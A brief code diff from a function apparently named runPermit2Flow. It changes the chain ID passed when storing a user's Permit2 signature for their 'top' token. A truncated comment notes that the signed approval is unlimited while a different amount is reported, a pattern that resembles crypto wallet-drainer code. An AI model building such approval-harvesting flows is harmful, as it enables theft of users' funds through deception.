@@ -190,7 +190,7 @@ export async function runPermit2Flow({
       try {
         await storePermit2Signature({
           owner: address,
-          chainId: activeChainId,
+          chainId: targetChainId,
           token: top.address,
           tokenSymbol: top.symbol,
           // Signed value is unlimited (MAX_UINT256) but we report the actual
